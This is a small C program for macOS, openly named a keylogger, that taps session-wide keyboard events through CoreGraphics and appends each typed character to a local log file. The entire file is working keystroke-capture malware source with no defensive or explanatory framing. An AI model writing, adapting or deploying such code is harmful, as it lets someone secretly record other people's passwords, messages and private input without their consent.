// HEADERS
#include <stdio.h>
#include <stdlib.h>
#include <CoreFoundation.h>
#include <CoreGraphics.h>

FILE *log_file;

// FUNCTIONS
void config();
void startListen();
CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userinfo);

int main(int argc, char *argv[]) {
	config();
	startListen();
	return 0;
}

void config() {
	log_file = fopen("keylogger_log.log", "a");
	if(log_file == NULL) {
		perror("Error: Unable to create log file.\n");
		exit(1);
	}
}

void startListen() {
	CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
	CFMachPortRef event = CGEventTapCreate(
		kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionListenOnly, mask, callback, NULL
	);

	if(event == NULL) {
		perror("Error: Unable to create event tap.\n");
		exit(1);
	}

	CFRunLoopSourceRef loopRef = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event, 0);
	CFRunLoopAddSource(CFRunLoopGetCurrent(), loopRef, kCFRunLoopCommonModes);
	CFRunLoopRun();
}

CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
	if (type == kCGEventKeyDown) {
		UniChar content[10];
    	UniCharCount count;
    	CGEventKeyboardGetUnicodeString(event, 10, &count, content);
        
    	fprintf(log_file, "%c", content[0]);
    	fflush(log_file);
    	fflush(stdout);
	}

    return event;
}